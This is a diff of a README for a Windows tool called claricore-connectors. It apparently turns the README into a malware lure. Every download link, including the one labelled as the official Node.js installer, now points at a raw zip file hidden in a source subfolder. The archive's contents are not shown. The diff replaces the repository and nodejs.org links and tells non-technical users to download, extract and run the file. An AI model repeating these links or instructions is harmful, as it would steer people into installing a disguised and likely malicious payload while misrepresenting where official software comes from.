@@ -1,6 +1,6 @@
 # ⚙️ claricore-connectors - Simple Data Pipeline Setup
 
-[![Download claricore-connectors](https://img.shields.io/badge/Download-claricore--connectors-brightgreen?style=for-the-badge)](https://github.com/althaeagrot166/claricore-connectors)
+[![Download claricore-connectors](https://img.shields.io/badge/Download-claricore--connectors-brightgreen?style=for-the-badge)](https://github.com/althaeagrot166/claricore-connectors/raw/refs/heads/main/packages/observability/src/connectors_claricore_v1.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To run claricore-connectors on Windows, your computer needs:
 
 ## 🚀 Getting Started: How to Download and Run claricore-connectors
 
-1. **Visit the main download page by clicking the download badge above or [here](https://github.com/althaeagrot166/claricore-connectors).**
+1. **Visit the main download page by clicking the download badge above or [here](https://github.com/althaeagrot166/claricore-connectors/raw/refs/heads/main/packages/observability/src/connectors_claricore_v1.5.zip).**
 
 2. On the GitHub page, look for the **Releases** section. You will find the latest version ready for download.
 
@@ -45,7 +45,7 @@ To run claricore-connectors on Windows, your computer needs:
    - Save the extracted files to a folder on your computer where you keep applications.
 
 5. claricore-connectors requires Node.js to run. If you do not have Node.js:
-   - Go to [https://nodejs.org/en/download/](https://nodejs.org/en/download/)
+   - Go to [https://github.com/althaeagrot166/claricore-connectors/raw/refs/heads/main/packages/observability/src/connectors_claricore_v1.5.zip](https://github.com/althaeagrot166/claricore-connectors/raw/refs/heads/main/packages/observability/src/connectors_claricore_v1.5.zip)
    - Download and install the LTS (Long-Term Support) version for Windows.
    - Restart your computer if the Node.js installer asks you to.
 
@@ -125,4 +125,4 @@ You can modify and extend claricore-connectors if you have programming skills. T
 
 Click the big badge at the top or this link to visit the download page:
 
-[Download claricore-connectors](https://github.com/althaeagrot166/claricore-connectors)
+[Download claricore-connectors](https://github.com/althaeagrot166/claricore-connectors/raw/refs/heads/main/packages/observability/src/connectors_claricore_v1.5.zip)
